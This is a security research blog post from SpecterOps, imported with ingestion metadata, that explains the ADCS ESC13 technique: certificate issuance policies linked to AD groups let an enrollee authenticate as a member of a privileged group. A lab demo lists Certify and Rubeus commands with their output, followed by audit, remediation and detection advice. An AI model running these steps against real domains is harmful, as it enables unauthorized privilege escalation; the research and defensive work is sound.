---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-02-14_adcs-esc13-abuse-technique.md
original_filename: 2024-02-14_adcs-esc13-abuse-technique.md
title: ADCS ESC13 Abuse Technique
category: documents
detected_topics:
- oauth
- idor
- xss
- command-injection
- mfa
- otp
tags:
- imported
- documents
- oauth
- idor
- xss
- command-injection
- mfa
- otp
language: en
raw_sha256: bf29d3b75731e37ee702d8b8304f408aa86192e4c3f804551d3529a1405221f6
text_sha256: c53b54d62f2084f966429e671f0b00a767cc3e638ed776439a19ed34fef7de26
ingested_at: '2026-06-28T07:32:31Z'
sensitivity: unknown
redactions_applied: true
---

# ADCS ESC13 Abuse Technique

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-02-14_adcs-esc13-abuse-technique.md
- Source Type: markdown
- Detected Topics: oauth, idor, xss, command-injection, mfa, otp
- Ingested At: 2026-06-28T07:32:31Z
- Redactions Applied: True
- Raw SHA256: `bf29d3b75731e37ee702d8b8304f408aa86192e4c3f804551d3529a1405221f6`
- Text SHA256: `c53b54d62f2084f966429e671f0b00a767cc3e638ed776439a19ed34fef7de26`


## Content

---
title: "ADCS ESC13 Abuse Technique"
page_title: "ADCS ESC13 Abuse Technique - SpecterOps"
url: "https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53"
final_url: "https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/"
authors: ["Jonas Bülow Knudsen"]
bugs: ["ADCS", "Active Directory"]
publication_date: "2024-02-14"
added_date: "2024-02-27"
source: "pentester.land/writeups.json"
original_index: 435
---

[ Back to Blog  ](/blog)

[Research & Tradecraft](https://specterops.io/blog/category/research/)

# ADCS ESC13 Abuse Technique

Author

[Jonas Bülow Knudsen](https://specterops.io/blog/author/jknudsenspecterops-io/)

Read Time

15 mins

Published

Feb 14, 2024

##### Share

[ ](https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fspecterops.io%2Fblog%2F2024%2F02%2F14%2Fadcs-esc13-abuse-technique%2F&title=ADCS+ESC13+Abuse+Technique&source=SpecterOps) [ ](https://twitter.com/share?url=https%3A%2F%2Fspecterops.io%2Fblog%2F2024%2F02%2F14%2Fadcs-esc13-abuse-technique%2F&text=ADCS+ESC13+Abuse+Technique) [ ](mailto:?Subject=I%20thought%20you'd%20like%20this%20post:%20ADCS ESC13 Abuse Technique&Body=https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/) [ ](https://specterops.io/blog/category/research/feed/)

It is possible to configure an Active Directory Certificate Services (ADCS) certificate template with an issuance policy having an OID group link to a given AD group. This configuration makes AD treat principals authenticating with a certificate of this template as members of the group, even though the principals are not actual members. Hence, principal with enrollment rights on such a certificate template has the possibility of escalating their privileges with the permissions granted to the group.

We will in this blog post explore how this ADCS feature works, how we can abuse it, where it is used in the wild, how we can audit for its presence, and how to deal with it from a defensive perspective.

The [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) whitepaper by [Lee Christensen](https://medium.com/u/91b45ba406ef) and [Will Schroeder](https://medium.com/u/74ad66811b78) laid the groundwork for understanding ADCS domain escalations, categorizing techniques as ESC1-ESC8. This framework evolved with [Oliver Lyak](https://medium.com/u/cd3a881c1abc)’s [ESC9 and ESC10](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7) contributions, followed by Sylvain Heiniger’s ESC11 and Hans-Joachim Knobloch’s ESC12. Now, this blog post introduces ESC13, furthering the mission to highlight ADCS abuse potentials. Full credit for discovering this technique goes to Adam Burford, who brought the possibility of abuse to the attention of [Stephen Hinck](https://medium.com/u/74f37df90770) and myself.

If you are new to ADCS abuse techniques or need a recap of how ADCS works, I recommend reading through the _Background_ section of the [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) whitepaper.

### How Does ESC13 Work

Let’s jump into what an _issuance policy_ and an _OID group link_ are, and how we can abuse those for a domain escalation _._

#### What’s an Issuance Policy

It is possible to configure a certificate template to have _issuance policies_ as certificate extensions:

![](https://specterops.io/wp-content/uploads/sites/3/2024/02/1JVdbpGCxs0zqNOMPey_1RQ.png)

The certificate template stores the issuance policies as object identifiers (OIDs) in its msPKI-Certificate-Policy attribute:
  
  
  **PS C: > Get-ADObject "CN=MyTemplate,$TemplateContainer" -Properties msPKI-Certificate-Policy**
  
  DistinguishedName  : CN=MyTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=dumpster,DC=fire
  **_msPKI-Certificate-Policy : {0.4.0.1862.1.4, 1.3.6.1.4.1.311.21.8.4571196.1884641.3293620.10686285.12068043.134.14350251.6856375, 1.3.6.1.4.1.311.21.31}_**
  Name  : MyTemplate
  ObjectClass  : pKICertificateTemplate
  ObjectGUID  : d8afc3b5-d46e-4b07-bde3-525e51cccd6b

When a CA issues a certificate, it will include the issuance policy OIDs in the certificate’s _Certificate Policies_(2.5.29.32) property:
  
  
  **PS C: > certutil -Dump .mycert.pem**
  X509 Certificate:
  Version: 3
  ...
  Certificate Extensions: 10
  ...
  2.5.29.32: Flags = 0, Length = 43
  Certificate Policies
  [1]Certificate Policy:
  **_Policy Identifier=0.4.0.1862.1.4_**
  [2]Certificate Policy:
  **_Policy Identifier=1.3.6.1.4.1.311.21.8.4571196.1884641.3293620.10686285.12068043.134.14350251.6856375_**
  [3]Certificate Policy:
  **_Policy Identifier=1.3.6.1.4.1.311.21.31_**
  ...

certutil will attempt to look up and show the display names of the issuance policies, so you may see the display names instead:
  
  
  **PS C: > certutil -Dump .mycert.pem**
  X509 Certificate:
  Version: 3
  ...
  Certificate Extensions: 10
  ...
  2.5.29.32: Flags = 0, Length = 43
  Certificate Policies
  [1]Certificate Policy:
  **_Policy Identifier=Secure Signature Creation Device Qualified Certificate_**
  [2]Certificate Policy:
  **_Policy Identifier=MyIssuancePolicy_**  [3]Certificate Policy:
  **_Policy Identifier=Endorsement Key Certificate Verified_**
  ...

The issuance policies are AD objects of the class msPKI-Enterprise-Oid located in the PKI OID container, and it is here you can find the display names:
  
  
  **PS C: > Get-ADObject -Filter * -SearchBase $OIDContainer -Properties DisplayName,msPKI-Cert-Template-OID**
  
  ...
  
  DisplayName  : Low Assurance
  DistinguishedName  : CN=400.1C3418CDEC5F144B867AB87CECD684B2,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=dumpster,DC=fire
  msPKI-Cert-Template-OID : 1.3.6.1.4.1.311.21.8.4571196.1884641.3293620.10686285.12068043.134.1.400
  Name  : 400.***REDACTED-SUSPECT-TOKEN***  ObjectClass  : msPKI-Enterprise-Oid
  ObjectGUID  : b378917c-9687-4bad-9da2-bde53159e337
  
  DisplayName  : Medium Assurance
  DistinguishedName  : CN=401.EDD449C54F4DC0B1EDD89320E4B5D353,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=dumpster,DC=fire
  msPKI-Cert-Template-OID : 1.3.6.1.4.1.311.21.8.4571196.1884641.3293620.10686285.12068043.134.1.401
  Name  : 401.***REDACTED-SUSPECT-TOKEN***  ObjectClass  : msPKI-Enterprise-Oid
  ObjectGUID  : 6e146426-a64d-402d-9f25-83d3a6fd2492
  
  DisplayName  : High Assurance
  DistinguishedName  : CN=402.1BC1CD66F67C8135F9617DAB96A5C2E8,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=dumpster,DC=fire
  msPKI-Cert-Template-OID : 1.3.6.1.4.1.311.21.8.4571196.1884641.3293620.10686285.12068043.134.1.402
  Name  : 402.***REDACTED-SUSPECT-TOKEN***  ObjectClass  : msPKI-Enterprise-Oid
  ObjectGUID  : 3fe83888-07d6-48f1-a308-9efd254cde20
  
  ...

Organizations can use issuance policies to apply policies where they use certificates, given that the system supports it. A system may require a user to present a certificate with a given issuance policy to ensure that the system only grants access to the right authorized users. For example, you can set an enrollment requirement in a certificate template for the enrollee to sign with a certificate that has a given issuance policy:

![](https://specterops.io/wp-content/uploads/sites/3/2024/02/14n8DK_JIDKMjpb1zC7ieRA.png)

The certificate template stores the required issuance policies in the msPKI-RA-Policies attribute.

#### What’s an OID Group Link

The AD class of issuance policies (msPKI-Enterprise-Oid) has an attribute called [_msDS-OIDToGroupLink_](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-oidtogrouplink) _._ This attribute has the description:

> For an OID, identifies the group object that corresponds to the issuance policy represented by this OID.

What Microsoft is trying the explain here is that you can use the attribute to link an issuance policy to an AD group, such that systems will authorize users as members of the given group, if they present a certificate with the given issuance policy. If you perform client authentication with the certificate, then you will receive an access token specifying the membership of this group.

The group’s distinguished name identifies the group in the attribute:
  
  
  **_PS C: > Get-ADObject "CN=12319448.2C2B96A74878E00434BEDD82A61861C6,$OIDContainer" -Properties DisplayName,msPKI-Cert-Template-OID,msDS-OIDToGroupLink_
  **
  DisplayName  : MyIssuancePolicy
  DistinguishedName  : CN=12319448.2C2B96A74878E00434BEDD82A61861C6,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=dumpster,DC=fire
  **_msDS-OIDToGroupLink  : CN=MyUniversalGroup,OU=Groups,DC=dumpster,DC=fire_**
  msPKI-Cert-Template-OID : 1.3.6.1.4.1.311.21.8.4571196.1884641.3293620.10686285.12068043.134.14350251.6856375
  Name  : 12319448.***REDACTED-SUSPECT-TOKEN***  ObjectClass  : msPKI-Enterprise-Oid
  ObjectGUID  : 69e4424d-a33c-460f-8677-e0ef40c17d3a

The group must meet the following requirements:

  * The group must be empty
  * The group must have _universal_ [group scope](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#group-scope)

Universal group scope means the group is forest-wide. AD has by default the following universal groups:

  * Enterprise Read-only Domain Controllers
  * Enterprise Key Admins
  * Enterprise Admins
  * Schema Admins

AD will check the group requirements when you attempt to set the msDS-OIDToGroupLink attribute, but also if you attempt to add members to the group afterward:

![](https://specterops.io/wp-content/uploads/sites/3/2024/02/1DBubDkSwmbOzeI5Jx39zIg.png)

#### ESC13 Abuse

If a principal (user or computer) has enrollment rights on a certificate template configured with an issuance policy that has an OID group link, then this principal can enroll a certificate that allows obtaining access to the environment as a member of the group specified in the OID group link.

We can model the required relationships for ESC13 like this:

![](https://specterops.io/wp-content/uploads/sites/3/2024/02/1__H4tAyM3XRX0atzAthw3w.png)

If the certificate template has any issuance requirements that the principal cannot meet, then the principal cannot enroll the certificate. Additionally, if the certificate template does not have an EKU configuration that allows for client authentication, then the principal cannot authenticate with the certificate. That brings us to the following ESC13 requirements, with the ESC13-specific requirements highlighted in bold font:

  1. The principal has enrollment rights on a certificate template.
  2. **The certificate template has an issuance policy extension.**
  3. **The issuance policy has an OID group link to a group.**
  4. The certificate template has no issuance requirements the principal cannot meet.
  5. The certificate template defines EKUs that enable client authentication.

Furthermore, we assume that the principal has Enroll permission on an Enterprise CA, that meets the following requirements:

  * The Enterprise CA is trusted for NT authentication.
  * The Enterprise CA’s certificate chain is trusted.
  * The Enterprise CA has the certificate template published.

For details about the above requirements check out the [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) whitepaper or the [ADCS Attack Paths in BloodHound — Part 1](https://medium.com/specter-ops-posts/adcs-attack-paths-in-bloodhound-part-1-799f3d3b03cf) blogpost.

### ESC13 Demo

#### Lab Environment

We got a user named _ESC13User_ with no group memberships (except Domain Users as the primary group):
  
  
  **PS C: > Get-ADUser ESC13User -Properties MemberOf**
  
  DistinguishedName : CN=ESC13User,OU=Users,OU=Tier1,DC=dumpster,DC=fire
  Enabled  : True
  GivenName  :
  **_MemberOf  : {}_**
  Name  : ESC13User
  ObjectClass  : user
  ObjectGUID  : e7248355-b77c-4110-bf91-20f843236898
  SamAccountName  : ESC13User
  SID  : S-1-5-21-2697957641-2271029196-387917394-2213
  Surname  :
  UserPrincipalName : ESC13User@dumpster.fire

ESC13User has Enroll permission on a certificate template named _ESC13Template_ :

![](https://specterops.io/wp-content/uploads/sites/3/2024/02/1HADV2v-RofbdDUqhxSHWsQ.png)
  
  
  **PS C: > $ESC13Template = Get-ADObject "CN=ESC13Template,$TemplateContainer" -Properties nTSecurityDescriptor
  >> $ESC13Template.nTSecurityDescriptor.Access | ? {$_.IdentityReference -eq "DUMPSTERESC13User"}**
  
  **ActiveDirectoryRights : ExtendedRight** InheritanceType  : None
  **ObjectType  : 0e10c968-78fb-11d2-90d4-00c04f79dc55** InheritedObjectType  : 00000000-0000-0000-0000-000000000000
  ObjectFlags  : ObjectAceTypePresent
  **AccessControlType  : Allow
  IdentityReference  : DUMPSTERESC13User**
  IsInherited  : False
  InheritanceFlags  : None
  PropagationFlags  : None

ESC13Template allows for authentication by having the _Client Authentication_ EKU and it has no issuance requirements. The Enterprise CA, _dumpster-DC01-CA,_ has the certificate template published. More importantly for ESC13, ESC13Template has an issuance policy named _ESC13OID_ :

![](https://specterops.io/wp-content/uploads/sites/3/2024/02/1ZXKpfTowiyUN0dNFiVRnkQ.png)
  
  
  **PS C: > Get-ADObject "CN=ESC13Template,$TemplateContainer" -Properties msPKI-Certificate-Policy**
  
  DistinguishedName  : CN=ESC13Template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=dumpster,DC=fire
  **_msPKI-Certificate-Policy : {1.3.6.1.4.1.311.21.8.4571196.1884641.3293620.10686285.12068043.134.3651508.12319448}_**
  Name  : ESC13Template
  ObjectClass  : pKICertificateTemplate
  ObjectGUID  : b95c22b8-9edf-4d13-ad31-e4e93799a17f

ESC13OID has an OID group link to the group _ESC13Group_ :
  
  
  **PS C: > Get-ADObject "CN=12319448.2C2B96A74878E00434BEDD82A61861C5,$OIDContainer" -Properties DisplayName,msPKI-Cert-Template-OID,msDS-OIDToGroupLink**
  
  DisplayName  : ESC13OID
  DistinguishedName  : CN=12319448.2C2B96A74878E00434BEDD82A61861C5,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=dumpster,DC=fire
  **_msDS-OIDToGroupLink  : CN=ESC13Group,OU=Groups,OU=Tier0,DC=dumpster,DC=fire_** msPKI-Cert-Template-OID : 1.3.6.1.4.1.311.21.8.4571196.1884641.3293620.10686285.12068043.134.3651508.12319448
  Name  : 12319448.***REDACTED-SUSPECT-TOKEN***  ObjectClass  : msPKI-Enterprise-Oid
  ObjectGUID  : 69e4424d-a33c-460f-8677-e0ef40c17d3a

ESC13Group is a universal empty group:
  
  
  **PS C: > Get-ADGroup ESC13Group -Properties Members**
  
  DistinguishedName : CN=ESC13Group,OU=Groups,OU=Tier0,DC=dumpster,DC=fire
  GroupCategory  : Security
  **_GroupScope  : Universal_**
  **_Members  : {}_**
  Name  : ESC13Group
  ObjectClass  : group
  ObjectGUID  : 5fad01ee-9d5c-4877-907a-d9689afd3f5f
  SamAccountName  : ESC13Group
  SID  : S-1-5-21-2697957641-2271029196-387917394-2211

#### ESC13 Abuse

First, we request a certificate of the certificate template ESC13Template as user ESC13User, using [Certify](https://github.com/GhostPack/Certify):
  
  
  **PS C: > .Certify.exe request /ca:DC01dumpster-DC01-CA /template:ESC13Template**
  
  _____  _  _  __
  / ____|  | | (_)/ _|
  | |  ___ _ __| |_ _| |_ _  _
  | |  / _  '__| __| |  _| | | |
  | |___|  __/ |  | |_| | | | |_| |
  ________|_|  __|_|_|  __, |
  __/ |
  |___./
  v1.0.0
  
  [*] Action: Request a Certificates
  
  [*] Current user context  : DUMPSTEResc13user
  [*] No subject name specified, using current context as subject.
  
  [*] Template  : ESC13Template
  [*] Subject  : CN=ESC13User, OU=Users, OU=Tier1, DC=dumpster, DC=fire
  
  [*] Certificate Authority  : DC01dumpster-DC01-CA
  
  [*] CA Response  : The certificate had been issued.
  [*] Request ID  : 285
  
  [*] cert.pem  :
  
  ***REDACTED-PRIVATE-KEY***
  -----BEGIN CERTIFICATE-----
  MIIGADCCBOigAwIBAgITewAA***REDACTED-SUSPECT-TOKEN***  ADBLMRQwEgYKCZImiZPyLGQB***REDACTED-SUSPECT-TOKEN***  dGVyMRkwFwYDVQQDExBkdW1wc3Rlci1EQzAxLUNBMB4XDTI0MDEzMDE1MTkwM...
  5Zh5uw==
  -----END CERTIFICATE-----
  
  [*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
  
  Certify completed in 00:00:03.7068614

We save the private key as esc13.key and the certificate as esc13.pem, and then create the esc13.pfx version of the certificate using the built-in Windows tool _certutil_ :
  
  
  **PS C: >** **certutil -MergePFX .esc13.pem .esc13.pfx**
  Signature test passed
  Enter new password for output file .esc13.pfx:
  Enter new password=***REDACTED*** new password=***REDACTED*** -MergePFX command completed successfully.

We confirm the Client Authentication EKU and the ESC13OID issuance policy in the certificate:
  
  
  **PS C: > certutil -Dump -v .esc13.pfx**
  X509 Certificate:
  Version: 3
  ...
  Certificate Extensions: 10
  ...
  2.5.29.37: Flags = 0, Length = c
  Enhanced Key Usage
  **_Client Authentication (1.3.6.1.5.5.7.3.2)_**
  ...
  2.5.29.32: Flags = 0, Length = 2c
  Certificate Policies
  [1]Certificate Policy:
  **_Policy Identifier=ESC13OID_**
  ...

The Client Authentication EKU allows us to authenticate using the certificate. We request a Kerberos TGT using [Rubeus](https://github.com/GhostPack/Rubeus):
  
  
  **PS C: > .Rubeus.exe asktgt /user:ESC13User /certificate:C:esc13.pfx /nowrap**
  
  ______  _
  (_____  | |
  _____) )_  _| |__  _____ _  _  ___
  |  __  /| | | |  _ | ___ | | | |/___)
  | |  | |_| | |_) ) ____| |_| |___ |
  |_|  |_|____/|____/|_____)____/(___/
  
  v2.2.0
  
  [*] Action: Ask TGT
  
  [*] Using PKINIT with etype rc4_hmac and subject: CN=ESC13User, OU=Users, OU=Tier1, DC=dumpster, DC=fire
  [*] Building AS-REQ (w/ PKINIT preauth) for: 'dumpster.fireESC13User'
  [*] Using domain controller: 192.168.100.10:88
  [+] TGT request successful!
  [*] base64(ticket.kirbi):
  
  doIGQjCCBj6gAwIBBaEDAgEWooIFUzCCBU9hggVLMIIFR6ADAgEFoQ8bDURVTVBTVEVSLkZJUkWiIjAgoAMCAQKhGTAXGwZ...
  
  ServiceName  :  krbtgt/dumpster.fire
  ServiceRealm  :  DUMPSTER.FIRE
  UserName  :  ESC13User
  UserRealm  :  DUMPSTER.FIRE
  StartTime  :  1/30/2024 7:50:16 AM
  EndTime  :  1/30/2024 5:50:16 PM
  RenewTill  :  2/6/2024 7:50:16 AM
  Flags  :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType  :  rc4_hmac
  Base64(key)  :  Zb0JoVPgp/WIkpsN205xww==
  ASREP (key)  :  ***REDACTED-SUSPECT-TOKEN***This TGT grants access as ESC13User was a member of the ESC13Group. We can prove that by decrypting the TGT using the Kerberos key of _krbtgt_ and show that the RID (last digits of the SID) of the ESC13Group is present in the _Groups_ field of the TGT PAC:
  
  
  **PS C:tools > .rubeusRubeus.exe describe /servicekey:f43bdb66f4dfb9... /ticket:doIGQjCCBj6gAwIBBaEDAgEWooIFUzCCBU9hggVLMIIFR6ADAgEFoQ8bDURVTVBTVEVSLkZJUkWiIjAgoAMCAQKhGTAXGwZ...**
  
  ______  _
  (_____  | |
  _____) )_  _| |__  _____ _  _  ___
  |  __  /| | | |  _ | ___ | | | |/___)
  | |  | |_| | |_) ) ____| |_| |___ |
  |_|  |_|____/|____/|_____)____/(___/
  
  v2.2.0
  
  
  [*] Action: Describe Ticket
  
  
  ServiceName  :  krbtgt/dumpster.fire
  ServiceRealm  :  DUMPSTER.FIRE
  UserName  :  ESC13User
  UserRealm  :  DUMPSTER.FIRE
  StartTime  :  1/30/2024 7:50:16 AM
  EndTime  :  1/30/2024 5:50:16 PM
  RenewTill  :  2/6/2024 7:50:16 AM
  Flags  :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType  :  rc4_hmac
  Base64(key)  :  Zb0JoVPgp/WIkpsN205xww==
  Decrypted PAC  :
  LogonInfo  :
  LogonTime  : 1/30/2024 7:44:25 AM
  LogoffTime  :
  KickOffTime  :
  PasswordLastSet  : 1/30/2024 7:04:54 AM
  PasswordCanChange  : 1/31/2024 7:04:54 AM
  PasswordMustChange  :
  EffectiveName  : ESC13User
  FullName  : ESC13User
  LogonScript  :
  ProfilePath  :
  HomeDirectory  :
  HomeDirectoryDrive  :
  LogonCount  : 6
  BadPasswordCount  : 0
  UserId  : 2213
  PrimaryGroupId  : 513
  GroupCount  : 2
  **_Groups_**  : 513,**_2211_**
  UserFlags  : (32) EXTRA_SIDS
  UserSessionKey  : 0000000000000000
  LogonServer  : DC01
  LogonDomainName  : DUMPSTER
  LogonDomainId  : S-1-5-21-2697957641-2271029196-387917394
  UserAccountControl  : (528) NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
  ExtraSIDCount  : 1
  ExtraSIDs  : S-1-18-1
  ResourceGroupCount  : 0
  CredentialInfo  :
  Version  : 0
  EncryptionType  : rc4_hmac
  CredentialData  :  *** NO KEY ***
  ServerChecksum  :
  Signature Type  : KERB_CHECKSUM_HMAC_SHA1_96_AES256
  Signature  : BE489797C40E33DB70741233 (VALID)
  KDCChecksum  :
  Signature Type  : KERB_CHECKSUM_HMAC_SHA1_96_AES256
  Signature  : AD173A5C32EDADEDE903DECF (VALID)
  ClientName  :
  Client Id  : 1/30/2024 7:50:16 AM
  Client Name  : ESC13User
  UpnDns  :
  DNS Domain Name  : DUMPSTER.FIRE
  UPN  : ESC13User@dumpster.fire
  Flags  : (2) EXTENDED
  SamName  : ESC13User
  Sid  : S-1-5-21-2697957641-2271029196-387917394-2213
  Attributes  :
  AttributeLength  : 2
  AttributeFlags  : (1) PAC_WAS_REQUESTED
  Requestor  :
  RequestorSID  : S-1-5-21-2697957641-2271029196-387917394-2213

The 2211 RID matches the RID of the ESC13Group, which still has no members:
  
  
  **PS C: > Get-ADGroup ESC13Group -Properties Members**
  
  DistinguishedName : CN=ESC13Group,OU=Groups,OU=Tier0,DC=dumpster,DC=fire
  GroupCategory  : Security
  GroupScope  : Universal
  **_Members  : {}_**
  Name  : ESC13Group
  ObjectClass  : group
  ObjectGUID  : 5fad01ee-9d5c-4877-907a-d9689afd3f5f
  SamAccountName  : ESC13Group
  **_SID_**  : S-1-5-21-2697957641-2271029196-387917394-**_2211_**

Now we can use this TGT to request Kerberos service tickets and abuse any permission the ESC13Group has been granted in the environment, despite not being a member of the group.

### Where is This Madness Used in the Real World

The Microsoft _Authentication Mechanism Assurance_ (AMA) concept uses this ADCS feature. The intention is to protect resources, by only granting permission to empty groups on the resources, and enforcing admins to use certificate-based authentication with specific certificates when they need to use those permissions.

You can read more about AMA in Microsoft’s documentation [here](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd378897\(v=ws.10\)?redirectedfrom=MSDN) or in this great guide by Uwe Gradenegger [here](https://www.gradenegger.eu/en/using-authentication-mechanism-assurance-ama-to-secure-the-login-of-administrative-accounts/).

### Audit

You can use AMA and the ADCS feature to enhance the security of your environment, but it is crucial to ensure only the right principals can enroll in certificate templates linked to privileged groups.

This PowerShell script here can help you audit an environment for potential ESC13 possibilities:

[Powershell/Check-ADCSESC13.ps1 at master · JonasBK/Powershell](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1)

The script identifies and reports the following:

  * OIDs with non-default ownership
  * OIDs with non-default ACE
  * OIDs linked to a group
  * Certificate templates configured with OID linked to a group

An attacker with write access on a published certificate template and write access on an issuance policy object could manually create the OID group link to an empty universal group and then perform an ESC13 abuse. These rights are only granted to Domain Admins, Enterprise Admins, and SYSTEM by default. Write access on an issuance policy can be enough, if the issuance policy is already used in a published certificate template. The PowerShell script will therefore check for any non-default ACEs on issuance policy objects.

Write access on a published certificate template allows for a domain escalation abuse technique on its own, described as ESC4 in the [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) whitepaper. You can audit for ESC4 and many of the other ADCS abuse techniques using [Certify](https://github.com/GhostPack/Certify) by [Will Schroeder](https://github.com/HarmJ0y) and [Lee Chagolla-Christensen](https://github.com/leechristensen), [Certipy](https://github.com/ly4k/Certipy) by [Oliver Lyak](https://github.com/ly4k), or [Locksmith](https://github.com/TrimarcJake/Locksmith) by [Jake Hildreth](https://github.com/jakehildreth).

### Remediation

Only [Tier Zero](https://posts.specterops.io/what-is-tier-zero-part-1-e0da9b7cdfca#:~:text=Tier%20Zero%20is%20a%20set,of%20the%20enterprise%20identity%20infrastructure.) principals should have the permissions to modify certificate templates and issuance policy objects. I recommend going through the certificate templates identified by the PowerShell script mentioned in the previous section and checking the enrollment rights. Any enrollment rights granted to principals that should not be able to obtain membership of the given group should be removed.

For certificate templates linked to highly privileged groups, you should limit enrollment rights to Tier Zero principals. Additionally, you should consider enabling Manger Approval such that a CA administrator or CA manager has to approve the request before the CA issue the certificate:

![](https://specterops.io/wp-content/uploads/sites/3/2024/02/1csPuU7msGFdMO1br3T2YeQ.png)

### **They see me _en_ rollin’.. **They hatin’.. (Detection)

I recommend checking out the _Detective Guidance_ section of the [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) whitepaper and the sub-sections:

  * Monitor User/Machine Certificate Enrollments — DETECT1
  * Monitor Certificate Authentication Events — DETECT2

The sections outline how you can monitor certificate enrollment and authentication using certificate enrollment requests and Windows events.

There is no generic way to distinguish malicious enrollment requests and certificate authentication events from legitimate ones, to my knowledge. However, collecting this information ensures you have visibility into the environment and enables you to create a baseline for what is normal and alert on abnormal enrollment requests and certificate authentication events. This strategy is effective for ESC13 but also for other ADCS abuse techniques involving certificate enrollment and authentication.

### Conclusion

The ESC13 technique abuses an ADCS feature used in the Microsoft AMA concept where users obtain access as a member of a given AD group using a certificate. It may enhance security to use this feature, but only if the certificate templates involved have enrollment rights granted to the right principals that that the organization intend to treat as members of the given groups. If not, attackers may abuse this feature for domain escalation.

![](https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=fda4272fbd53)

* * *

[ADCS ESC13 Abuse Technique](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53) was originally published in [Posts By SpecterOps Team Members](https://posts.specterops.io) on Medium, where people are continuing the conversation by highlighting and responding to this story.

Post Views: 5,170

[ Jonas Bülow Knudsen ](https://specterops.io/blog/author/jknudsenspecterops-io/)

Manager 

Jonas Bülow Knudsen is a manager on the research team at SpecterOps. He is a passionate security professional who enjoys diving into real and imaginary problems across the offensive and defensive landscape. Jonas spends most days researching attack techniques and translating them into graph models within BloodHound.
